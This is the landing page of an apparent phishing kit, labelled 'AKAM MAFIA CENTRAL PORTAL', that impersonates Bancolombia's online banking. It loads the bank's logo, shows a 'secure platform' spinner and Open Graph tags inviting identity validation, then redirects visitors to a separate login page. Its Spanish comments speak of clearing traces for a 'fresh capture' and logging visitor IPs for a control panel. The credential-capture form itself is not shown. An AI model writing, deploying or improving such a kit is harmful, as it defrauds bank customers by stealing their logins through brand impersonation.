<?php
// index.php - AKAM MAFIA CENTRAL PORTAL
session_start();
session_destroy(); // Limpiamos rastro previo para asegurar captura fresca

// Ajuste de ruta: Verifica que funciones.php esté en esta ubicación
if(file_exists('panel/lib/funciones.php')){
    require_once('panel/lib/funciones.php');
}

// Opcional: Captura de IP inicial para el panel (si tu función lo permite)
// $ip_visitante = $_SERVER['REMOTE_ADDR'];
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Bancolombia | Sucursal Virtual Personas</title>
    
    <meta property="og:title" content="Bancolombia | Sucursal Virtual Personas">
    <meta property="og:description" content="Inicie sesión para validar su identidad en nuestra plataforma segura.">
    <meta property="og:image" content="img/seguridad.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">

    <link rel="icon" type="image/png" href="img/logo.png" />
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    
    <style>
        body { background-color: #fff; margin: 0; padding: 0; font-family: 'Open Sans', sans-serif; }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .text-loader { 
            color: #2c2c2c; 
            font-size: 15px; 
            margin-top: 25px;
            font-weight: 500;
        }
        /* Animación suave de carga */
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fd0; /* Color Bancolombia */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader-container">
        <img src="img/logo.png" width="160" alt="Bancolombia" style="margin-bottom: 20px;">
        <div class="spinner"></div>
        <div class="text-loader">Cargando plataforma segura...</div>
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            // Limpiamos el localStorage al inicio para que no se mezclen datos de sesiones viejas
            localStorage.clear();
            
            // Redirección automática al login
            setTimeout(function() {
                window.location.href = "a/login.php"; 
            }, 2000);
        });
    </script>
</body>
</html>
